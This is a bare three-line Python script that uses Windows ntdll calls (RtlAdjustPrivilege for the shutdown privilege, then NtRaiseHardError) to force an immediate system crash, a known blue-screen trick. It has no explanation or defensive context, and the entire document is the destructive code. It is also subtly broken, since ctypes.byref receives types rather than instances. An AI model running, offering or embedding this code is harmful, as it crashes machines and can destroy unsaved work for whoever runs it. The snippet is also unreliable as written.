import ctypes
ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool)) 
ctypes.windll.ntdll.NtRaiseHardError(0xC0000001, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint))
